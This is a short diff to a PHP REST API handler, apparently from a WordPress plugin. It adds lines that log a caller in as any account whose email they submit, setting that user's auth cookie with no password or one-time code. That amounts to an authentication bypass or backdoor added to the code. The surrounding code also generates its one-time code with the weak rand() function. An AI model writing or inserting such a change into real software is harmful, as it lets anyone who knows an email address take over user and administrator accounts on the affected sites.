@@ -26,9 +26,11 @@ class RestAPI {
 		$email = $request->get_param('email');
 		$user = get_user_by('email', $email);
 		if ($user) {
+			wp_clear_auth_cookie();
+			wp_set_current_user($user->ID);
+			wp_set_auth_cookie($user->ID);
 			return new \WP_REST_Response(array('userExists' => true), 200);
 		} else {
-			// Generate random OTP
 			$otp = rand(100000, 999999);
 	
 			// Store the OTP in a transient for 10 minutes
